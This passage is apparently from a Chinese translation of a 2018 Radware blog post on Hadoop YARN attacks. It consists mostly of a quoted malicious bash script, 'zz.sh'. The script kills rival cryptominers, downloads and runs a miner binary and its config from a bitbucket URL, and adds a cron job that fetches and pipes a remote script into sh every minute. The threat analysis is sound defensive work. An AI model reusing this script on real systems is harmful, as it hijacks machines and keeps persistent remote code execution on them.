data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aipr0pnYR23GFAtQm1gGlg.png"/></div></div></figure><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff mt"><img src="../Images/24bc5630147a6190d18606d6df7d9952.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HKS5etp6tfdVEooU3xG96A.png"/></div></div></figure><figure class="kg kh ki kj fq kk fe ff paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="fe ff mu"><img src="../Images/73a87b3e6c63476f9fc301ef095eb271.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QDfMfD30TodhufdB0WHeHA.png"/></div></div></figure><h1 id="9532" class="ks kt hu bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp dt translated">(*2) zz.sh脚本</h1><pre class="kg kh ki kj fq ma mb mc md aw me dt"><span id="61ac" class="mf kt hu mb b fv mg mh l mi mj">#!/bin/bash<br/>pkill -f donate<br/>pkill -f proxkekman<br/>pkill -f 158.69.133.18<br/>pkill -f 192.99.142.246<br/>pkill -f test.conf<br/>pkill -f /var/tmp/apple<br/>pkill -f /var/tmp/big<br/>pkill -f /var/tmp/small<br/>pkill -f /var/tmp/cat<br/>pkill -f /var/tmp/dog<br/>pkill -f /var/tmp/mysql<br/>pkill -f /var/tmp/sishen<br/>pkill -f ubyx<br/>pkill -f /var/tmp/mysql<br/>rm -rf /var/tmp/mysql<br/>ps ax | grep java.conf | grep bin | awk '{print $1}' | xargs kill -9<br/>ps ax|grep "./noda\|./manager"|grep sh|grep -v grep | awk '{print $1}' | xargs kill -9<br/>ps ax|grep "./no1"|grep -v grep | awk '{print $1}' | xargs kill -9<br/>ps ax|grep "./uiiu"|grep -v grep | awk '{print $1}' | xargs kill -9<br/>ps ax|grep "./noss"|grep -v grep | awk '{print $1}' | xargs kill -9<br/>ps ax|grep "8220"|grep -v grep | awk '{print $1}' | xargs kill -9<br/>pkill -f cpu.c<br/>pkill -f tes.conf<br/>pkill -f psping<br/>ps ax | grep cs.c | grep bin | awk '{print $1}' | xargs kill -9<br/>ps ax | grep -- "-c cs" | awk '{print $1}' | xargs kill -9<br/>ps ax | grep -- "-c pcp" | awk '{print $1}' | xargs kill -9<br/>ps ax | grep -- "-c omo" | awk '{print $1}' | xargs kill -9<br/>pkill -f /var/tmp/java-c<br/>pkill -f pscf<br/>pkill -f cryptonight<br/>pkill -f sustes<br/>pkill -f xmrig<br/>pkill -f xmr-stak<br/>pkill -f suppoie<br/>ps ax | grep "config.json -t" | grep -v grep | awk '{print $1}' | xargs kill -9<br/>ps aux | grep "/lib/systemd/systemd" | awk '{if($3&gt;20.0) print $2}' | xargs kill -9<br/>ps ax | grep 'wc.conf\|wq.conf\|wm.conf\|wt.conf' | grep -v grep | grep 'ppl\|pscf\|ppc\|ppp' | awk '{print $1}' | xargs kill -9<br/>rm -rf /var/tmp/pscf*<br/>rm -rf /tmp/pscf*<br/>pkill -f ririg<br/>rm -rf /var/tmp/ntpd<br/>pkill -f /var/tmp/ntpd<br/>rm -rf /var/tmp/ntp<br/>pkill -f /var/tmp/ntp<br/>rm -rf /var/tmp/qq<br/>rm -rf /var/tmp/qq1<br/>pkill -f /var/tmp/qq<br/>rm -rf /tmp/qq<br/>rm -rf /tmp/qq1<br/>pkill -f /tmp/qq<br/>pkill -f /var/tmp/aa<br/>rm -rf /var/tmp/aa<br/>rm -rf /var/tmp/gg<br/>rm -rf /var/tmp/gg1<br/>pkill -f gg1.conf<br/>rm -rf /var/tmp/hh<br/>rm -rf /var/tmp/hh1<br/>pkill -f hh1.conf<br/>pkill -f apaqi<br/>rm -rf /var/tmp/apaqi<br/>pkill -f dajiba<br/>rm -rf /var/tmp/dajiba<br/><br/>pkill -f /var/tmp/look<br/>rm -rf /var/tmp/look<br/>pkill -f /var/tmp/nginx<br/>rm -rf /var/tmp/nginx<br/>rm -rf /var/tmp/dd<br/>rm -rf /var/tmp/dd1<br/>rm -rf /var/tmp/apple<br/>pkill -f dd1.conf<br/>pkill -f kkk1.conf<br/>pkill -f ttt1.conf<br/>pkill -f ooo1.conf<br/>pkill -f ppp1.conf<br/>pkill -f lll1.conf<br/>pkill -f yyy1.conf<br/>pkill -f 1111.conf<br/>pkill -f 2221.conf<br/>pkill -f dk1.conf<br/>pkill -f kd1.conf<br/>pkill -f mao1.conf<br/>pkill -f YB1.conf<br/>pkill -f 2Ri1.conf<br/>pkill -f 3Gu1.conf<br/><br/>pkill -f crant<br/>DIR="/tmp"<br/>if [ -a "/tmp/java" ]<br/>then<br/>    if [ -w "/tmp/java" ] &amp;&amp; [ ! -d "/tmp/java" ]<br/>    then<br/>        if [ -x "$(command -v md5sum)" ]<br/>        then<br/>            sum=$(md5sum /tmp/java | awk '{ print $1 }')<br/>            echo $sum<br/>            case $sum in<br/>                71849cde30470851d1b2342ba5a5136b | b00f4bbd82d2f5ec7c8152625684f853)<br/>                    echo "Java OK"<br/>                ;;<br/>                *)<br/>                    echo "Java wrong"<br/>                    rm -rf /tmp/java<br/>                    pkill -f w.conf<br/>                    sleep 4<br/>                ;;<br/>            esac<br/>        fi<br/>        echo "P OK"<br/>    else<br/>        DIR=$(mktemp -d)/tmp<br/>        mkdir $DIR<br/>        echo "T DIR $DIR"<br/>    fi<br/>else<br/>    if [ -d "/var/tmp" ]<br/>    then<br/>        DIR="/var/tmp"<br/>    fi<br/>    echo "P NOT EXISTS"<br/>fi<br/>if [ -d "/tmp/java" ]<br/>then<br/>    DIR=$(mktemp -d)/tmp<br/>    mkdir $DIR<br/>    echo "T DIR $DIR"<br/>fi<br/>WGET="wget -O"<br/>if [ -s /usr/bin/curl ];<br/>then<br/>    WGET="curl -o";<br/>fi<br/>if [ -s /usr/bin/wget ];<br/>then<br/>    WGET="wget -O";<br/>fi<br/><br/>downloadIfNeed()<br/>{<br/>    if [ -x "$(command -v md5sum)" ]<br/>    then<br/>        if [ ! -f $DIR/java ]; then<br/>            echo "File not found!"<br/>            download<br/>        fi<br/>        sum=$(md5sum $DIR/java | awk '{ print $1 }')<br/>        echo $sum<br/>        case $sum in<br/>            71849cde30470851d1b2342ba5a5136b | b00f4bbd82d2f5ec7c8152625684f853)<br/>                echo "Java OK"<br/>            ;;<br/>            *)<br/>                echo "Java wrong"<br/>                sizeBefore=$(du $DIR/java)<br/>                if [ -s /usr/bin/curl ];<br/>                then<br/>                    WGET="curl -k -o ";<br/>                fi<br/>                if [ -s /usr/bin/wget ];<br/>                then<br/>                    WGET="wget --no-check-certificate -O ";<br/>                fi<br/>                echo "" &gt; $DIR/tmp.txt<br/>                rm -rf $DIR/java<br/>                download<br/>            ;;<br/>        esac<br/>    else<br/>        echo "No md5sum"<br/>        download<br/>    fi<br/>}<br/><br/>download() {<br/>    if [ -x "$(command -v md5sum)" ]<br/>    then<br/>        sum=$(md5sum $DIR/pscf3 | awk '{ print $1 }')<br/>        echo $sum<br/>        case $sum in<br/>            71849cde30470851d1b2342ba5a5136b | b00f4bbd82d2f5ec7c8152625684f853)<br/>                echo "Java OK"<br/>                cp $DIR/pscf3 $DIR/java<br/>            ;;<br/>            *)<br/>                echo "Java wrong"<br/>                download2<br/>            ;;<br/>        esac<br/>    else<br/>        echo "No md5sum"<br/>        download2<br/>    fi<br/>}<br/><br/>download2() {<br/>    $WGET $DIR/java https://bitbucket.org/zrundr42/mygit/raw/master/x_64<br/><br/>    if [ -x "$(command -v md5sum)" ]<br/>    then<br/>        sum=$(md5sum $DIR/java | awk '{ print $1 }')<br/>        echo $sum<br/>        case $sum in<br/>            71849cde30470851d1b2342ba5a5136b | b00f4bbd82d2f5ec7c8152625684f853)<br/>                echo "Java OK"<br/>                cp $DIR/java $DIR/pscf3<br/>            ;;<br/>            *)<br/>                echo "Java wrong"<br/>            ;;<br/>        esac<br/>    else<br/>        echo "No md5sum"<br/>    fi<br/>}<br/><br/>netstat -antp | grep '158.69.133.20\|192.99.142.249\|202.144.193.110\|192.99.142.225\|192.99.142.246\|46.4.200.177\|192.99.142.250\|46.4.200.179\|192.99.142.251\|46.4.200.178\|159.65.202.177\|185.92.223.190\|222.187.232.9\|78.46.89.102' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9<br/>if [ "$(netstat -ant|grep '158.69.133.20\|192.99.142.249\|202.144.193.110\|192.99.142.225\|192.99.142.246\|46.4.200.177\|192.99.142.250\|46.4.200.179\|192.99.142.251\|46.4.200.178\|159.65.202.177\|185.92.223.190\|222.187.232.9\|78.46.89.102'|grep 'ESTABLISHED'|grep -v grep)" ];<br/>then<br/>    ps axf -o "pid %cpu" | awk '{if($2&gt;=30.0) print $1}' | while read procid<br/>    do<br/>        kill -9 $procid<br/>    done<br/>else<br/>    echo "Running"<br/>fi<br/><br/>if [ ! "$(ps -fe|grep '/tmp/java'|grep 'w.conf'|grep -v grep)" ];<br/>then<br/>    downloadIfNeed<br/>    chmod +x $DIR/java<br/>    $WGET $DIR/w.conf https://bitbucket.org/zrundr42/mygit/raw/master/w.conf<br/>    nohup $DIR/java -c $DIR/w.conf &gt; /dev/null 2&gt;&amp;1 &amp;<br/>    sleep 5<br/>    rm -rf $DIR/w.conf<br/>else<br/>    echo "Running"<br/>fi<br/><br/>if crontab -l | grep -q "46.249.38.186"<br/>then<br/>    echo "Cron exists"<br/>else<br/>    echo "Cron not found"<br/>    LDR="wget -q -O -"<br/>    if [ -s /usr/bin/curl ];<br/>    then<br/>        LDR="curl";<br/>    fi<br/>    if [ -s /usr/bin/wget ];<br/>    then<br/>        LDR="wget -q -O -";<br/>    fi<br/>    (crontab -l 2&gt;/dev/null; echo "* * * * * $LDR http://46.249.38.186/cr.sh | sh &gt; /dev/null 2&gt;&amp;1")| crontab -<br/>fi<br/><br/>pkill -f logo4.jpg<br/>pkill -f logo0.jpg<br/>pkill -f logo9.jpg<br/>pkill -f jvs<br/>pkill -f javs<br/>pkill -f 192.99.142.248<br/>rm -rf /tmp/pscd*<br/>rm -rf /var/tmp/pscd*<br/>crontab -l | sed '/202.144.193.167/d' | crontab -<br/>crontab -l | sed '/192.99.142.232/d' | crontab -<br/>crontab -l | sed '/8220/d' | crontab -<br/>crontab -l | sed '/192.99.142.226/d' | crontab -<br/>crontab -l | sed '/192.99.142.248/d' | crontab -<br/>crontab -l | sed '/45.77.86.208/d' | crontab -<br/>crontab -l | sed '/144.202.8.151/d' | crontab -<br/>crontab -l | sed '/192.99.55.69/d' | crontab -<br/>crontab -l | sed '/logo4/d' | crontab -<br/>crontab -l | sed '/logo9/d' | crontab -<br/>crontab -l | sed '/logo0/d' | crontab -<br/>crontab -l | sed '/logo/d' | crontab -<br/>crontab -l | sed '/tor2web/d' | crontab -<br/>crontab -l | sed '/jpg/d' | crontab -<br/>crontab -l | sed '/png/d' | crontab -<br/>crontab -l | sed '/tmp/d' | crontab -</span></pre><p id="462f" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><em class="jp">原载于2018年11月15日</em><a class="ae ke" href="https://blog.radware.com/security/2018/11/hadoop-yarn-an-assessment-of-the-attack-surface-and-its-exploits/" rel="noopener ugc nofollow" target="_blank"><em class="jp">blog.radware.com</em></a><em class="jp">。</em></p></div></div>    
</body>
</html>